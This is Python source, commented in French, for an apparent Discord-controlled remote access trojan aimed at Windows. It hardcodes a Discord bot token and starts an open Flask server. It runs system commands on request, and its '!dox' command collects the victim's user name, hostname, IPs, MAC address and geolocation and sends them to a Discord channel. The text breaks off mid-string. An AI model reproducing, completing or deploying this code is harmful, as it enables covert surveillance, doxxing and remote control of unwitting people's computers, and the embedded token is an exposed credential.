import discord
import subprocess
import os
import keyboard
import asyncio
import sys
import pyautogui
import cv2
import platform
import uuid
import socket
import requests
import win32api
from datetime import datetime
from flask import Flask, send_from_directory
from threading import Thread
import ctypes
import ctypes.wintypes

# --- CONFIGURATION DE LA CONSOLE (UTF-8) ---
if sys.platform == "win32":
    _k32 = ctypes.windll.kernel32
    for _hid in (-10, -11, -12):
        _h = _k32.GetStdHandle(_hid)
        _m = ctypes.wintypes.DWORD(0)
        if _k32.GetConsoleMode(_h, ctypes.byref(_m)):
            _k32.SetConsoleMode(_h, _m.value | 0x0004 | 0x0001)
    _k32.SetConsoleOutputCP(65001)
    _k32.SetConsoleCP(65001)

# --- CONFIGURATION DISCORD ---
intents = discord.Intents.default()
intents.message_content = True # Nécessaire pour lire les commandes
client = discord.Client(intents=intents)

# /!\ METS TON NOUVEAU TOKEN ICI /!\
TOKEN = 'MTUwNDQ2MTcyMjI3MzE4OTkwOQ.GuEpVZ.24CsfmpjgFg7sL8zU1slmqQdXYNJTl5PKg1atk' 

# --- SERVEUR FLASK POUR LES IMAGES ---
app = Flask(__name__)
IMAGE_FOLDER = 'images'
if not os.path.exists(IMAGE_FOLDER):
    os.makedirs(IMAGE_FOLDER)

@app.route('/images/<filename>')
def get_image(filename):
    return send_from_directory(IMAGE_FOLDER, filename)

def run_flask_app():
    # Le port 5000 est souvent utilisé, on peut le changer si besoin
    app.run(host='0.0.0.0', port=5000, threaded=True)

# Lancement de Flask dans un thread séparé
Thread(target=run_flask_app, daemon=True).start()

# --- LOGIQUE DES COMMANDES ---
async def process_command(message):
    content = message.content.lower()

    # 1. Commandes de base
    if content.startswith('!salut'):
        await message.channel.send('Salut ! Prêt à recevoir des ordres.')

    elif content.startswith('!ipconfig'):
        process = subprocess.Popen(['ipconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, _ = process.communicate()
        await message.channel.send(f"```\n{output.decode('latin-1')}\n```")

    # 2. Section DOX & OSINT
    elif content.startswith('!dox'):
        await message.channel.send("🛠️ **Génération du rapport de Dox en cours...**")
        try:
            # Récupération de la localisation via l'IP
            geo = requests.get('https://ipapi.co/json/').json()
            pub_ip = requests.get('https://api.ipify.org').text
            
            dox_data = {
                "👤 IDENTITÉ SYSTÈME": "",
                "Utilisateur": os.getlogin(),
                "Propriétaire (Win)": win32api.GetUserName(),
                "Nom du PC": socket.gethostname(),
                "OS": f"{platform.system()} {platform.release()} ({platform.version()})",
                "Architecture": platform.machine(),
                
                "\n🌐 RÉSEAU & LOCALISATION": "",
                "IP Publique": pub_ip,
                "IP Locale": socket.gethostbyname(socket.gethostname()),
                "Adresse MAC": ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)][::-1]),
                "Ville": geo.get('city', 'Inconnue'),
                "Région": geo.get('region', 'Inconnue'),
                "Pays": geo.get('country_name', 'Inconnu'),
                "Fournisseur (ISP)": geo.get('org', 'Inconnu'),
                
                "\n📍 COORDONNÉES": "",
                "Latitude": geo.get('latitude'),
                "Longitude": geo.get('longitude'),
                "Google Maps": f"https://www.google.com/maps?q={geo.get('latitude')},{geo.get('longitude')}"
            }

            report = "